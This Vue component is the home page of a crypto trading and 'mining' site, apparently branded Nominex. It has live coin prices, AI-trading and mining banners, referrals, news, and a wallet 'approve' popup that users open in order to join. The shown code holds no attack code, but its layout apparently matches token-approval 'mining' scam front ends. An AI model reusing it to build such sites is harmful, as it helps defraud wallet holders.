<template>
    <div>
        <div class="top-container" data-v-41ea2f78="" >
            <div class="home-top" data-v-41ea2f78="" style="    background: linear-gradient(179.88deg, #021e43 .11%, #002961 99.9%);">
                <img class="menu-icon" @click="chageShowMenu(true)" src="../assets/static/image/icon_menus.d24882c7.svg" data-v-41ea2f78="">
                
                <!-- <img class="top-img" src="../assets/static/image/img_home_top.099d659e.png" data-v-41ea2f78=""> -->
                <div class="top-title" data-v-41ea2f78="" style="font-size: 0.72rem; font-weight: 700;"> <img src="../assets/static/image/nominex.890d1d1b.svg" data-v-41ea2f78="" class="" style="width: 150px;"></div>
                <div class="top-subtitle" data-v-41ea2f78="" style="width: 70%; font-size: 0.32rem;">
                    {{ $t('key175') }} <br> {{ $t('key176') }}
             
                </div>
            </div>
        </div>
        <div class="market-container" data-v-41ea2f78="">
            <div class="trade-wrapper" data-v-41ea2f78="">
                <div class="trade-title" data-v-41ea2f78="">{{$t('key152')}}</div>
                <div class="process" data-v-41ea2f78="">
                    <div class="process-item" :class="[tabindex === 0 ? 'active' : '']" @click="changeTabIndex(0)" data-v-8f186750="" data-v-41ea2f78="" v-if="0">
                        <div class="icon-wrapper" data-v-8f186750="">
                            <!---->
                            <span data-v-8f186750="">{{$t('key153')}}</span>
                        </div>
                    </div>
                    <div class="process-item" :class="[tabindex === 1 ? 'active' : '']" @click="changeTabIndex(1)" data-v-8f186750="" data-v-41ea2f78="">
                        <div class="icon-wrapper" data-v-8f186750="">
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:star-24-filled" data-v-8f186750="">
                                <g fill="none">
                                    <path d="M10.788 3.103c.495-1.004 1.926-1.004 2.421 0l2.358 4.777l5.273.766c1.107.161 1.549 1.522.748 2.303l-3.816 3.72l.901 5.25c.19 1.103-.968 1.944-1.959 1.424l-4.716-2.48l-4.715 2.48c-.99.52-2.148-.32-1.96-1.424l.901-5.25l-3.815-3.72c-.801-.78-.359-2.142.748-2.303L8.43 7.88l2.358-4.777z" fill="currentColor"></path>
                                </g>
                            </svg>
                            <span data-v-8f186750="" style="margin-left: 3px;line-height: 1;" v-if="tabindex === 1">{{$t('key154')}}</span>
                        </div>
                    </div>
                    <div class="process-item" :class="[tabindex === 2 ? 'active' : '']" @click="changeTabIndex(2)" data-v-8f186750="" data-v-41ea2f78="">
                        <div class="icon-wrapper" data-v-8f186750="">
                            <span data-v-8f186750="" style="line-height: 1;">{{$t('key155')}}</span>
                        </div>
                    </div>
                </div>
                <div class="market-list" data-v-41ea2f78="">
                    <div class="rank-header" @click="go('/business', { contract_id: item.contract_id })" data-v-41ea2f78="" v-for="(item, index) in biList" :key="index" :class="[item.bool ? '' : 'ynone']">
                        <div class="rank-name d-flex" data-v-41ea2f78="">
                            <img :src="item.icon" data-v-41ea2f78="">
                            <div data-v-41ea2f78="">
                                <span class="name" data-v-41ea2f78="">{{ item.coin }}</span>
                                <span class="name" data-v-41ea2f78="" style="font-weight: 500; color: rgb(95, 103, 117); font-family: NunitoSemibold;">usdt</span>
                            </div>
                        </div>
                        <div class="rank-latest" data-v-41ea2f78="">
                            <homekline v-if="item.kData" :kData="item.kData" :change="item.change"></homekline>
                        </div>
                        <div class="rank-change" data-v-41ea2f78="">
                            <div class="price" data-v-41ea2f78="">$ {{ item.close }}</div>
                            <div class="change" data-v-41ea2f78="">
                                <span class="rise" data-v-41ea2f78="" v-if="Number(item.change) >= 0">+{{ item.change }}%</span>
                                <span class="fall" data-v-41ea2f78="" v-if="Number(item.change) < 0">{{ item.change }}%</span>
                                <span data-v-41ea2f78="">24 Hrs</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!---->
        </div>
        <div class="banner-container" data-v-41ea2f78="">
            <div class="home-banner-container" data-v-41ea2f78="">
                <div class="banner-content" data-v-41ea2f78="" @click="go('/ai')">
                    <div class="banner-title" data-v-41ea2f78="">Ai{{$t('key156')}}</div>
                    <div class="banner-subtitle" data-v-41ea2f78="">{{$t('key157')}}Api</div>
                    <div class="banner-img" data-v-41ea2f78="">
                        <img src="../assets/static/image/img_banner.dbd07ead.png" alt="" data-v-41ea2f78="">
                    </div>
                </div>
                <div class="banner-content" data-v-41ea2f78="" @click="go('/mining')">
                    <div class="banner-title" data-v-41ea2f78="">{{$t('key112')}}</div>
                    <div class="banner-subtitle" data-v-41ea2f78="">{{$t('key122')}}</div>
                    <div class="banner-img" data-v-41ea2f78="">
                        <img src="../assets/static/image/img_banner_1.330f874d.png" alt="" data-v-41ea2f78="">
                    </div>
                </div>
            </div>
        </div>
        <div class="invite-container" data-v-41ea2f78="">
            <div class="home-invite" data-v-41ea2f78="" @click="go('/share')">
                <div class="invite-title" data-v-41ea2f78="">{{$t('key159')}}</div>
                <div class="invite-content" data-v-41ea2f78="">
                    <div class="fs-32" data-v-41ea2f78="">{{$t('key159')}}{{$t('key164')}}</div>
                    <div class="fs-44" data-v-41ea2f78="">{{$t('key161')}}</div>
                    <div class="invite-img" data-v-41ea2f78="">
                        <img src="../assets/static/image/icon_arrow.3a19d906.svg" class="img-arrow" data-v-41ea2f78="">
                        <img src="../assets/static/image/img_invite.edacfcdd.png" class="img-invite" data-v-41ea2f78="">
                    </div>
                </div>
            </div>
        </div>
        <div class="news-container" data-v-41ea2f78="">
            <div class="home-news" data-v-41ea2f78="">
                <div class="news-title" data-v-41ea2f78="">
                    <div data-v-41ea2f78="">{{$t('key0')}}</div>
                    <div class="more" data-v-41ea2f78="" @click="go('/news-list')">{{$t('key162')}}</div>
                </div>
                <div class="news-content" data-v-41ea2f78="">
                    <div class="news-item" data-v-41ea2f78="" v-for="(item, index) in newsList" :key="index" @click="changenewsPanelModal(true, item.link)">
                        <div class="news-info" data-v-41ea2f78="">
                            <div class="main-title" data-v-41ea2f78="">
                                <span class="fs-26" data-v-41ea2f78=""> {{item.title}} </span>
                                <span class="date fs-26" data-v-41ea2f78="">{{item.news_time}}</span>
                            </div>
                            <div class="subtitle" data-v-41ea2f78="">{{item.abstract}}</div>
                            <div class="author" data-v-41ea2f78="">{{item.author}} </div>
                        </div>
                        <div class="news-img" data-v-41ea2f78="">
                            <img :src="item.image" class="img-pic" data-v-41ea2f78="">
                        </div>
                    </div>
                </div>
                <div class="news-tips" data-v-41ea2f78="">{{$t('key163')}}</div>
            </div>
        </div>

        <kefu />

        <van-popup v-model="showMenu" position="left" :style="{ height: '100%' }">
            <div class="is-active mobile-main-sidebar" ref="leftSidebar" style="width: auto;min-width: 4.2rem;padding-right: 0.1rem;position: static;">
                <div class="inner">
                    <ul class="icon-side-menu">
                        <div class="drawer-header" data-v-41ea2f78="">
                            <div class="d-flex" data-v-41ea2f78="" style="margin-top: 5px;" @click="chageShowMenu(false)">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent sidebar-svg" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:dismiss-24-regular" data-v-41ea2f78="">
                                    <g fill="none">
                                        <path d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z" fill="currentColor"></path>
                                    </g>
                                </svg>
                            </div>
                        </div>
                        <div class="drawer-logo" data-v-41ea2f78="">
                           <!-- <div style="background-color: rgb(5, 36, 123); color: rgb(255, 255, 255); width: 200px; text-align: center; padding: 4px; font-weight: 700;">
                                <a href="https://www.aavepro.cyou" style="color: rgb(255, 255, 255);">aavepro.cyou</a>
                            </div>-->
                            <div class="wallet-address" data-v-41ea2f78="">
                                <div data-v-41ea2f78="">
                                    <img src="../assets/static/image/avatar.33e95978.png" alt="" class="avatar" data-v-41ea2f78="">
                                </div>
                                <div data-v-41ea2f78="">{{ellipsisAddress(walletObj.address)}}</div>
                                <div class="copy-btn btn-copy" :data-clipboard-text="walletObj.address" @click="copy" data-v-41ea2f78="">
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:copy-24-regular" data-v-41ea2f78="">
                                        <g fill="none">
                                            <path d="M5.503 4.627L5.5 6.75v10.504a3.25 3.25 0 0 0 3.25 3.25h8.616a2.251 2.251 0 0 1-2.122 1.5H8.75A4.75 4.75 0 0 1 4 17.254V6.75c0-.98.627-1.815 1.503-2.123zM17.75 2A2.25 2.25 0 0 1 20 4.25v13a2.25 2.25 0 0 1-2.25 2.25h-9a2.25 2.25 0 0 1-2.25-2.25v-13A2.25 2.25 0 0 1 8.75 2h9zm0 1.5h-9a.75.75 0 0 0-.75.75v13c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-13a.75.75 0 0 0-.75-.75z" fill="currentColor"></path>
                                        </g>
                                    </svg>
                                </div>
                            </div>
                            <div>
                                <span>
                                  UID: {{ userinfo.uid }}
                                </span>
                            </div>
                        </div>
                        <!---->
                        <div class="join-btn" data-v-41ea2f78="">
                            <button type="button" aria-hidden="false" class="button button v-button is-fullwidth" v-if="userinfo.status == 0" data-v-41ea2f78="" @click="showShouquan(false)">
                                <span>
                                    <img src="../assets/static/image/icon_join.btn.44a592cf.svg" data-v-41ea2f78="">
                                    <span data-v-41ea2f78="">{{$t('key164')}}</span>
                                </span>
                            </button>
                            <button type="button" aria-hidden="false" class="button button v-button is-fullwidth" v-if="userinfo.status == 1" data-v-41ea2f78="" @click="go('/authorized-activity')">
                                <span>
                                    <img src="../assets/static/image/icon_join.btn.44a592cf.svg" data-v-41ea2f78="">
                                    <span data-v-41ea2f78="">{{$t('key165')}}</span>
                                </span>
                            </button>
                        </div>
                        <div class="menu-item" data-v-41ea2f78="">
                            <div class="item-title" data-v-41ea2f78="">{{$t('key166')}}</div>
                            <li class="drawer-item" data-v-41ea2f78="" v-if="userinfo.status == 0" @click="showShouquan(true)">
                                <img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key70')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" v-if="userinfo.status == 1" @click="go('/wallet')">
                                <img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key70')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/ai')">
                                <img src="../assets/static/image/icon_menu_ai.e895c6df.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">Ai{{$t('key167')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/mining')">
                                <img src="../assets/static/image/icon_menu_mining.ebcf82be.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key112')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/miningrecord')">
                                <img src="../assets/static/image/icon_menu_record.d0fd71ac.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key73')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/share')">
                                <img src="../assets/static/image/icon_menu_share.2e020ec7.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key171')}}</span>
                            </li>
                            <a :href="configInfo.chatLink" data-v-41ea2f78="">
                                <li class="drawer-item" data-v-41ea2f78="">
                                    <img src="../assets/static/image/icon_menu_cs.05117d1f.svg" data-v-41ea2f78="">
                                    <span data-v-41ea2f78="">{{$t('key168')}}</span>
                                </li>
                            </a>
                           <!-- <li class="drawer-item" data-v-41ea2f78="" @click="go('/kyc')">
                                <img src="../assets/static/image/icon_menu_record.d0fd71ac.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">KYCxxx 验证</span>
                            </li>-->
                            <!-- <li class="drawer-item" data-v-41ea2f78="" @click="go('/help')">
                                <img src="../assets/static/image/icon_menu_qa.7ec34a68.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">Q&amp;A</span>
                            </li> -->
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/language')">
                                <img src="../assets/static/image/icon_menu_set.81a4b22b.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key106')}}</span>
                            </li>
                        </div>
                    </ul>
                    <ul class="bottom-icon-side-menu"></ul>
                </div>
            </div>
        </van-popup>

        <div data-v-51fd882a="" v-if="noticeModal" style="z-index: 2004;">
            <div class="notice-popup van-popup van-popup--center" data-v-51fd882a="" style="z-index: 2077;">
                <div class="notice-container" data-v-51fd882a="">
                    <div class="notice-title" data-v-51fd882a="">
                        <span data-v-51fd882a="">{{noticeInfo.title}}</span>
                        <div data-v-51fd882a="">
                            <svg @click="changenoticeModal(false)" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent icon-close" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:dismiss-24-regular" data-v-51fd882a="">
                                <g fill="none">
                                    <path d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z" fill="currentColor"></path>
                                </g>
                            </svg>
                        </div>
                    </div>
                    <div class="notice-content" data-v-51fd882a="">
                        <!---->
                        <span data-v-51fd882a="">
                            <p v-html="noticeInfo.content"></p>
                        </span>
                    </div>
                    <!---->
                    <!---->
                </div>
            </div>
        </div>

        <approve v-model="shouquanModal" v-if="shouquanModal" :isShowToast="isShowToast"></approve>

        <news-panel v-model="newsPanelModal" :url="link">
        </news-panel>
    </div>
</template>

<script>
import headerNav from '@/components/header-nav.vue'
import kefu from '@/components/kefu.vue'
import homekline from '@/components/homekline.vue'
import newsPanel from '@/components/news-panel.vue'
import approve from '@/components/approve.vue'
import Clipboard from 'clipboard'
import { getContractList, getKlineData, getNewsList, findNotice } from '@/api/user'
import { mapActions } from 'vuex'
import config from '@/config'
import { localSave, localRead } from "@/libs/util"

export default {
    name: 'home',
    props: {
    },
    components: {
        approve,
        headerNav,
        kefu,
        newsPanel,
        homekline
    },
    computed: {
        userinfo() {
            return this.$store.state.user.userinfo
        },
        configInfo() {
            return this.$store.state.user.configInfo
        },
        walletObj() {
            return this.$store.state.user.walletObj
        }
    },
    data() {
        return {
            isShowToast: false,
            // websocket
            ws: {},
            wsUrl: ``,
            heart_jump: false, //websocket 心跳状态
            ws_heart: '', // ws心跳定时器
            //websocket持续连接的定时器
            continuous_link: null,
            noticeModal: false,
            newsPanelModal: false,
            showMenu: false,
            tabindex: 0,
            shouquanModal: false,
            biList: [],
            type: 1,
            currBiList: [],
            newsList: [],
            link: '',
            noticeInfo: {}
        }
    },
    watch: {
        tabindex() {
            this.type = this.tabindex + 1
            this.getContractList2()
        },
        userinfo () {
            if (this.biList.length <= 0) {
                this.getContractList()
            }
        }
    },
    mounted() {
        if (window.location.protocol === 'http:') {
            this.wsUrl = `ws://${config.wssHost}/ws/`
        } else {
            this.wsUrl = `wss://${config.wssHost}/ws/`
        }
        // if (!sessionStorage.getItem("noticeModal")) this.changenoticeModal(true)
        this.getContractList()
        this.getNewsList()
        this.findNotice()
    },
    beforeDestroy () {
        this.close_heart();
        this.ws.close();
    },
    methods: {
        ellipsisAddress (str) {
            if (!str) return
            let address = str.slice(0, 4) + '****' + str.substr(-4)
            return address
        },
        findNotice () {
            findNotice({ type: 1 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.noticeInfo = data.data
                    if (localRead('notice') !== data.data.token) {
                        this.changenoticeModal(true)
                        localSave('notice', data.data.token)
                    }
                }
            })
        },
        getNewsList () {
            getNewsList({
                page: 1,
                page_size: 5
            }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.newsList = data.data.list
                }
            })
        },
        // WebSjocket操作
        creat_socket(url) {
            this.ws = new WebSocket(url);
            this.close_heart();
            this.initWebSocket();
        },
        initWebSocket() {
            let that = this;
            let ws = that.ws;
            // 打开WebSjocket
            ws.onopen = function (e) {
                console.log("WebSjocket已经打开");
                that.heart_jump = true; // 心跳状态打开
                // that.heart();
                let json = JSON.stringify({ "sub": "ticker" })
                let qingli = JSON.stringify({ "unsub": "ticker" })
                that.ws.send(qingli);
                that.ws.send(json);

                // 再次清除防止重复请求
                clearInterval(that.continuous_link);
            };

            // 接收WebSjocket
            // let mouse_over = [];
            ws.onmessage = (event) => {

                if ((!event && !event.data) || event.data == "undefined") {
                    return;
                } else {
                    let data = JSON.parse(event.data)
                    if (data.channel) {
                        // console.log(data)
                        that.biList.forEach((item, index) => {
                            if (item.coin_alias == data.data.symbol) {
                                if (that.biList[index].kData) {
                                    that.biList[index].kData[that.biList[index].kData.length - 1] = {
                                        open: Math.abs(data.data.open),
                                        close: Math.abs(data.data.close),
                                        time: that.biList[index].kData[that.biList[index].kData.length - 1].time,
                                        value: Math.abs(data.data.close)
                                    }
                                    that.changeCurrKdata(that.biList[index].kData, index)
                                }
                            }
                        })
                    }
                    // that.ws.send(json);
                    // console.log(data);
                }
            }
            // 关闭
            ws.onclose = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;

                }
                console.log("WebSocket关闭");
            };

            // WebSocket发生错误
            ws.onerror = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;
                }
                that.reconnect(that.wsUrl);
                console.log("WebSocket发生错误");
            };
        },

        heart(props) {
            let that = this;
            this.ws_heart = setInterval(() => {
                that.ws.send(props);
            }, 10 * 1000);
        },

        close_heart() {
            console.log("ws心跳结束");
            clearInterval(this.ws_heart);
            this.ws_heart = null;
        },

        reconnect(url) {
            if (this.lockReconnect) return;
            this.lockReconnect = true;
            let that = this;
            // 先清除定时器
            clearInterval(this.continuous_link);

            this.continuous_link = setInterval(function () {
                //没连接上会一直重连，设置延迟避免请求过多
                that.lockReconnect = false;
                that.creat_socket(url);
                console.log("重启中...");
            }, 5000);
        },
        checkIsShow(coin_alias) {
            let arr = this.currBiList.filter(item => {
                return item.coin_alias === coin_alias
            })
            return arr.length
        },
        getContractList2(isInit) {
            getContractList({ type: this.type }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let currBiList = data.data
                    this.currBiList = currBiList
                    this.biList.forEach((item, index) => {
                        if (this.checkIsShow(item.coin_alias)) this.$set(this.biList[index], "bool", true)
                        else this.biList[index].bool = this.$set(this.biList[index], "bool", false)
                    })
                    // if (isInit) this.init()
                }
            })
        },
        getContractList() {
            getContractList({ type: 3 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.biList = data.data
                    if (data.data.length > 0) {
                        this.getContractList2(true)
                        this.biList.forEach((item, index) => {
                            this.getKlineData(item.contract_id, index)
                        })
                    }
                    // //页面刚进入时开启长连接
                    this.creat_socket(this.wsUrl)
                }
            })
        },
        getKlineData(contract_id, index) {
            getKlineData({ interval: '60', contract_id }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let kData = []
                    data.data = data.data.slice(0, 20)
                    data.data.forEach((item, index2) => {
                        let time = this.timetrans(item.now_time)
                        kData.unshift({
                            open: item.open,
                            close: item.close,
                            time: item.now_time,
                            value: item.close
                        })
                    })
                    this.changeCurrKdata(kData, index)
                }
            })
        },
        changeCurrKdata (kData, index) {
            let nowItem = kData[kData.length - 1]
            let change = ((nowItem.close - nowItem.open) / nowItem.open * 100).toFixed(2)
            this.$set(this.biList[index], "kData", kData)
            this.$set(this.biList[index], "change", change)
            this.$set(this.biList[index], "close", kData[kData.length - 1].close)
        },
        timetrans(date) {
            var date = new Date(date * 1000)//如果date为10位需要乘1000
            var Y = date.getFullYear() + '-'
            var M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-'
            var D = (date.getDate() < 10 ? '0' + (date.getDate()) : date.getDate())
            var h = (date.getHours() < 10 ? '0' + date.getHours() : date.getHours()) + ':'
            var m = (date.getMinutes() < 10 ? '0' + date.getMinutes() : date.getMinutes()) + ':'
            var s = (date.getSeconds() < 10 ? '0' + date.getSeconds() : date.getSeconds())
            // return `${Y}${M}${D} ${h}${m}${s}`
            return `${Y}${M}${D}`
        },
        ...mapActions([
            'getuserinfo'
        ]),
        showShouquan(isShowToast) {
            this.isShowToast = isShowToast
            this.shouquanModal = true
        },
        changenoticeModal(bool) {
            // if (!bool) sessionStorage.setItem("noticeModal", "1")
            this.noticeModal = bool
        },
        copy() {
            var clipboard = new Clipboard('.btn-copy')
            clipboard.on('success', e => {
                this.$toast({
                    message: this.$t('key96'),
                    icon: 'success',
                })
                // 释放内存
                clipboard.destroy()
            })
            clipboard.on('error', e => {
                // 不支持复制
                this.$toast({
                    message: this.$t('key97'),
                    icon: 'cross',
                })
                // 释放内存
                clipboard.destroy()
            })
        },
        go(path, query) {
            this.$router.push({ path, query })
        },
        changenewsPanelModal(bool, link) {
            this.link = link
            this.newsPanelModal = bool
        },
        chageShowMenu(bool) {
            this.showMenu = bool
        },
        changeTabIndex(tabindex) {
            this.tabindex = tabindex
        }
    }
}
</script>

<style>
.notice-popup[data-v-51fd882a] {
    position: fixed;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, .7);
}

.notice-popup .notice-container[data-v-51fd882a] {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    margin: auto;
    width: 6.38rem;
    height: 6.44rem;
    background: #fff;
    border-radius: 0.2rem;
    box-sizing: border-box;
    overflow: auto;
}

.notice-popup .notice-container .notice-title[data-v-51fd882a] {
    position: fixed;
    text-align: center;
    color: #1652f0;
    font-size: .3rem;
    font-family: NunitoBold;
    background-color: #fff;
    padding: 0.32rem;
    width: 6.2rem;
    border-top-left-radius: 8px;
}

.notice-popup .notice-container .notice-content[data-v-51fd882a] {
    padding: 0.32rem;
    margin-top: 0.8rem;
    font-size: .28rem;
    color: #353f5280;
    line-height: normal;
}

.notice-popup .notice-container .notice-title .icon-close[data-v-51fd882a] {
    position: absolute;
    right: 0;
    top: 0;
    bottom: 0;
    margin: auto;
    width: 0.32rem;
    height: 0.32rem;
    color: #000;
}

.join-popup[data-v-51fd882a] {
    padding: 0.48rem 0.4rem 0.35rem;
    width: 6.86rem;
    box-sizing: border-box;
    border-radius: 0.2rem;
}

.join-popup .close[data-v-51fd882a] {
    position: absolute;
    top: 0.32rem;
    right: 0.32rem;
}

.join-popup .popup-content[data-v-51fd882a] {
    text-align: center;
}

.join-popup .popup-content .img-join[data-v-51fd882a] {
    width: 1.27rem;
    height: 1.27rem;
}

.join-popup .popup-content .join-title[data-v-51fd882a] {
    margin-top: 0.67rem;
    padding: 0 0.7rem;
    font-size: .32rem;
    color: #353f52;
    font-weight: 500;
}

.join-popup .popup-content .submit-btn[data-v-51fd882a] {
    margin: 0 auto;
    margin-top: 0.87rem;
    width: 4.46rem;
    height: 0.92rem;
    line-height: .92rem;
    color: #fff;
    background: #1652f0;
    border-radius: 0.2rem;
    text-align: center;
    font-size: .32rem;
}

.ff_NunitoBold {
    font-family: NunitoBold;
}

.join-popup .popup-content .tips[data-v-51fd882a] {
    margin-top: 0.4rem;
    font-size: .24rem;
    color: #5b616e80;
}

svg[data-v-51fd882a] {
    width: 0.4rem;
    height: 0.4rem;
}

.ynone {
    opacity: 0;
    position: fixed;
    top: -9999px;
    left: -9999px;
}
</style>

